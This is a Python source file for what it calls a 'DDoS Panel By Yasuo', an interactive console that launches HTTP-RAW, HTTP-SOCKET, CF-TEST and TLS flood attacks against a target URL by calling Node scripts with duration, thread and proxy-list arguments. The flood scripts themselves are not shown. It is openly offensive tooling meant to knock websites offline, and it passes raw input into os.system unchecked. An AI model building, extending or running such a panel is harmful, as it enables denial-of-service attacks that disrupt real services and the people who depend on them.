import subprocess
import os
import time
import socket
import requests
import random
import getpass
import sys
import json
import platform
import colorama
from colors import string


author = "Yasuo"


def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 0, 0)
end_color = (0, 0, 255)

class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET
	
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = r"""
  ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"   GREETZ TO YOU      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  I LOVE DDOS!   |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_Yasuo.py  |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
This DDoS Tols is Weak --> Yasuo
                            
"""
    author = r"""
		Ddos Panel By Yasuo
    """
    prints(start_color, end_color, banner)
    prints(end_color, start_color, author)
    print("\n") 
    print(Color.LB+"           ["+Color.LR+"Layer 7"+Color.LB+"]"+Color.LC+"HTTP-RAW"+Color.LR+"       ["+Color.LG+"Layer 7"+Color.LR+"]"+Color.LC+"CF-TEST")
    print("\n") 
    print(Color.LR+"           ["+Color.LG+"Layer 7"+Color.LR+"]"+Color.LC+"HTTP-SOCKET"+Color.LB+"       ["+Color.LR+"Layer 7"+Color.LB+"]"+Color.LC+"TLS")
    print("\n")
    
    while True:
        cnc = input(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"root"+Color.LB+"@"+Color.LG+"yasuo"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
        if "HTTP-RAW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node methods/HTTP-RAW/HTTP-RAW.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-RAW <url> <time>')
                print('Example: HTTP-RAW http://example.com 60')
        
        elif "HTTP-SOCKET" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node methods/HTTP-SOCKET/HTTP-SOCKET.js {url} {time} {threads}')
            except IndexError:
                print('Usage: HTTP-SOCKET <url> <time> <threads>')
                print('Example: HTTP-SOCKET http://example.org 60 5')
                
        elif "CF-TEST" in cnc:
            try:
                method = cnc.split()[1]
                url = cnc.split()[2]
                proxylist = cnc.split()[3]
                time = cnc.split()[4]
                req_per_ip = cnc.split()[5]
                threads = cnc.split()[6]
                os.system(f'node methods/CF-TEST/CF-TEST.js {method} {url} {proxylist} {time} {req_per_ip} {threads}')
            except IndexError:
                print('Usage: http-requests [Method] [Target] [Proxy List] [Time] [Requests Per IP] [Threads]')
                print('Example: GET https://tls.mrrage.xyz/nginx_status proxy.txt 50 124 5')
                
        elif "TLS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                request = cnc.split()[3]
                thread = cnc.split()[4]
                proxyfile = cnc.split()[5]
                os.system(f'node methods/TLS/TLS.js {url} {time} {request} {thread} {proxyfile}')
            except IndexError:
                print('Usage: TLS [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]')
                print('Example: https://tls.mrrage.xyz/nginx_status 50 124 5 proxy.txt')
                                
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Method: [ " + cmmnd + " ] Error Command")
            except IndexError:
                pass
                
if author == "Yasuo":
    main()
else:
    string.authorYasuo()